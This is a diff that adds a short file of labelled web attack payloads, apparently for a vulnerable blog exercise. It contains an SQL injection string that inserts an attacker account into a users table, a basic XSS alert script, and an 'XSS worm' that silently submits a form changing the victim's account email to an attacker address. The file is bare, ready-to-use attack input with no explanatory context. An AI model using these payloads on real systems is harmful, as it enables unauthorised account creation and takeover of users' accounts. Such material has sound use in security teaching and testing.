@@ -1,0 +1,8 @@
+SQL Injection:
+pass'); INSERT INTO users (fname, lname, email, username, password) VALUES ('Malicious', 'Attacker', 'attacker@malicious_blog.com', 'mal', 'hack
+
+XSS:
+First<script>alert("Hacked!")</script>
+
+XSS Worm:
+hacked@malicious_blog.com <script> function post_to_url(path, params, method) { method = method || "post"; var form = document.createElement("form"); form.setAttribute("method", method); form.setAttribute("action", path); for(var key in params) { if(params.hasOwnProperty(key)) { var hiddenField = document.createElement("input"); hiddenField.setAttribute("name", key); hiddenField.setAttribute("value", params[key]); form.appendChild(hiddenField); } } document.body.appendChild(form); form.submit(); } post_to_url("edit.php", {"email":"hacked@malicious_blog.com"}, "post"); </script>
